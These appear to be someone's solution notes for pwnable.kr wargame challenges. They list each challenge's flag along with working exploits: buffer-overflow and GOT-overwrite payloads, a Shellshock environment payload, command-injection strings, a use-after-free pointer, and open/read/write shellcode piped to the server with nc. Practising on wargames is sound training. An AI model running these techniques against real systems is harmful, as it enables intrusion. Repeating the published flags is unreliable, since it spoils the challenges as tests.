
collision: `python -c "import sys; sys.stdout.write('\xc8\xce\xc5\x06'*4 + '\xcc\xce\xc5\x06')" | xargs ./col`
 - daddy! I just managed to create a hash collision :)


bof: `(python -c "print 'a'*52 + '\xbe\xba\xfe\xca'"; cat -) | nc pwnable.kr 9000`
 - Note: the `cat -` is necessary for keeping the connection open and listening
   for our input.
 - `cat flag`
 - daddy, I just pwned a buFFer :)

flag:
 - UPX...? sounds like a delivery service :)

```bash
curl http://pwnable.kr/bin/flag > flag`

# Run strings on it and see that a line tells us it is packed by UPX
strings flag -n 10 | less

# unpack it 
upx -d flag

# string again for the flag
strings -n 10 flag | grep ":)$"
```




#play
 - We see ASLR is enabled `cat /proc/sys/kernel/randomize_va_space`.
   [More](https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/)


#passcode

Key: Sorry mom.. I got confused about scanf usage :(

Solution: `python -c 'import struct; print "\x41"*96 + struct.pack("<I", 0x0804a018) + "134514147"' 2> /dev/null`

Idea: We want to exploit the Global Offset Table (GOT) to make the call to
`exit` (in the login function) actually call the line `system("/bin/cat
flag")`. Fortunately, their use of scanf allows us to write to an arbitrary
location in memory because the value of passcode1 is interpreted as a pointer
by scanf. 

To make passcode1 point where we want it, we have to use residual data on the
stack left by the call to the welcome function. After some stack examination we
see that the location of the last 4 bytes of the name array are the same
location used for password one. Thus, we need to put our pointer there.

```
import struct; print "\x41"*96 + struct.pack("<I", 0x0804a018)
```

But what should we point to? Here's where the GOT comes in. We use the
following command to figure out the dynamic relocations of the exit function:
`objdump -R passcode`. In this case, it is at `0x0804a018`. We want to write a
new value to this address (done as part of the vulnerable scanf) to cause the
call to exit to jump to a different bit of code. A bit of disassembly
examination tells use that 0x80485e3 would be a good location as that is the
start of the call to system in the login function. 

Tricky bit: scanf uses the format specifier `%d` so we have to input the target
address as an ascii decimal string. So we convert 0x80485e3 (the address that
begins the call to system in the login function) to decimal 134514147.


# random

This challenge is pretty easy because they use the stdlib rand function without
providing a seed. As a result, the variable `random` is actually the same each
time. The solution is to write a bit of C code to find out that value---it is
1804289383 by the way---and then XOR with the value 0xdeadbeef to figure out
what the input key needs to be.

solution: `echo 3039230856 | ./random`
key: Mommy, I thought libc random is unpredictable...


# input

> Mom? how can I pass my input to a computer program?

key: Mommy! I learned how to pass various input in Linux :)

Solution: See below. Lots of steps.

We need two bash sessions. On the first run this:

```bash
mkdir /tmp/muffins/
cd /tmp/muffins/

ln -s ~/flag flag

# We have to use env because Bash doesn't like environment variables with
# strange names.
env `python -c "import sys; sys.stdout.write('\xde\xad\xbe\xef=\xca\xfe\xba\xbe')"` xargs -a input.in -d, ~/input <p2stdout.txt 2< p2stderr.txt
```

On the second, run this:

```bash
python -c "import sys; sys.stdout.write('\xde\xad\xbe\xef')" | nc localhost 30303
```

Here's the `gen_input.py` setup script:
```python
import sys
import time

# Stage 1
args =["a" for i in range(99)] 

args[64] = "\x00" 
args[65] = "\x20\x0a\x0d" 
args[66] = "30303" # Stage 3 port number

with open('input.in', 'w') as f:
 f.write(','.join(args))

# Stage 2
with open('p2stdout.txt', 'w') as f:
 f.write('\x00\x0a\x00\xff')

with open('p2stderr.txt', 'w') as f:
 f.write('\x00\x0a\x02\xff')


# Stage 4

with open('\x0a', 'w') as f:
  f.write('\x00\x00\x00\x00')

```

# shellshock

key: only if I knew CVE-2014-6271 ten years ago..!!

solution: Just exploit the shellshock vulnerability (CVE-2014-6271).

```bash
export MUFN="() { :; }; cat /home/shellshock/flag"
./shellshock
```

# blackjack

key: `YaY_I_AM_A_MILLIONARE_LOL`

solution: make a bet for -10000000, play the hand, and then play another.


# lotto

key: `sorry mom... I FORGOT to check duplicate numbers... :(`

solution: the forloop is bugged, so you really only need to match one number.
Just use "######" as your input string and you should get it after 6 or 7
tries. We use "#" because it has an ascii decimal value less than 45. 

# cmd1

key: `mommy now I get what PATH environment is for :)`

solution: 

```bash

export MUFN="/bin/cat /home/cmd1/flag;"

#Note: we have to escape the $ so bash does substitute in the value
./cmd1 "eval \$MUFN"

```

# cmd2

key: `FuN_w1th_5h3ll_v4riabl3s_haha`

Solution: You are logged in under a different shell (Dash) than usual...wonder
why? Well, turns out we want to use some features of Bash to solve this
problem.

```bash
~/cmd2 "read -p 'hola?' yn; eval \$yn"
hola?/bin/cat /home/cmd2/flag
```

# uaf

key: `yay_f1ag_aft3r_pwning`

```
python -c "print 'h\x15@\x00\x00\x00\x00\x00' * 3" | head -c 24 > uaf_ptr 
./uaf 24 uaf_ptr

# Then select
 - 1 
 - 2
 - 2
 - 3
```



As the name suggest, we are going to exploit a use after free vulnerability.
The source code suggests that we need to free the man and woman objects and
then exploit their vtables. Vtables are how virtual functions are implemented
in C++; they record at runtime where the introduce() and give_shell() functions
reside.  Our approach is to free the man object and put a pointer to
give\_shell() entry in the vtable.  Importantly, vtables are stored per class
(not per object) so removing the man object does not remove the vtable.

Frustratingly, the behavior on our local machines did not match the behavior on
remote machine in two important ways. First, the size of the man object was 48
bytes locally, but only 24 bytes on the remote server. Second, the allocator
locally did not want to reuse memory while the remote allocated did
immediately. This second issue forced us to waste time on a technique to write
a lot of repeated data to the heap until memory was reused. 

```
import struct
struct.pack('<Q', 0x000000401570-8)
```


#memcpy

key: `1_w4nn4_br34K_th3_m3m0ry_4lignm3nt`

Solution: We need to figure out how to set the allocation sizes to keep the
program from crashing. A quick GDB session tells us the program is crashing
when it executes line 34 of the source code: `movntps %%xmm0, (%1)`. If we look
at the details of this instruction, we see that it requires 16-byte alignment.
Thus, we need to make sure malloc is always giving us memory aligned on 16
bytes, but malloc only guarantees an 8-byte alignment (defined in the C spec
"largest native word size). Further, we have to content with the malloc head
(8 bytes). 

In the end, we just need to use the following arguments to solve the challenge.
If you look, you'll see that the malloc address always end in a zero, e.g.,
0x?0.

```
8
24
40
72
138
264
520
1032
2056
4104
```

# asm

key: `Mak1ng_shelLcodE_i5_veRy_eaSy`

Solution: We just need to write some shell code to read the flag file, but the
only system calls we can use are open, read, and write. Fortunately, we don't
have to worry about null bytes in our shell code. 

Here's the assembly:

```asm
  .global _start

  .text

_start:
  call ender
setup:
  xor %rax, %rax
  xor %rbx, %rbx
  xor %rcx, %rcx
  xor %rdx, %rdx
  xor %rsi, %rsi
  xor %rdi, %rdi

  #print the path

open:
  #open the flag file
  pop %rdi # string address
  xor %rsi, %rsi # zero flags
  xor %rdx, %rdx # read only mode 
  mov $2, %rax # syscall open
  syscall
  cmpl $0x0, %eax
  jns read  # fd >= 0 
  jmp error  # fd < 0, file wasnt opened

# This error block is executed if the file couldn't be opened, typically because the filename is wrong (did you forget the to null terminate the string?)
error:
  mov %rdi, %rsi
  xor %rdx, %rdx
  xor %rdi, %rdi
  xor %rax, %rax
  mov $231, %dl  # arg: length
  mov $1, %dil # arg: file descriptor
  mov $1, %rax # system call number: write
  syscall

  jmp exit

read: 

  #make space on the stack for the flag
  # we only need 67 bytes, but lets align it to 8 bytes
  sub $72, %rsp

  #read the flag
  mov %rax, %rdi # arg fg
  lea (%rsp), %rsi 
  mov $67, %rdx
  xor %rax, %rax # syscall read
  syscall

key:
  lea (%rsp), %rsi # arg: char*
  mov $67, %dl # arg: len
  mov $1, %rdi # arg: fd stdout 
  mov $1, %rax # system call number: write
  syscall


exit:
  xor %rdi, %rdi # exit code 0
  mov $60, %rax # system call exit
  syscall 


ender:
  call setup
  .asciz
"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
  .byte 0x0 #put this zero here to null terminate the string. asciz should also null terminate, but it wasn't working properly on the server 

```

And here is a helper script to run on the server:

```bash
#!/usr/bin/env bash

as -o shell.o shell.asm && ld -o shell shell.o

MUFN=`for i in $(objdump -d shell -M intel |grep "^ " |cut -f2); do echo -n
'\x'$i; done;echo`

dir=`pwd`
cd

echo 'Now in ' `pwd`

python -c "import sys; sys.stdout.write('$MUFN')" | ./asm
echo
cd $dir

echo 'Now in ' `pwd`
echo "Trying for the real key"

python -c "import sys; sys.stdout.write('$MUFN')" | nc 0 9026
```
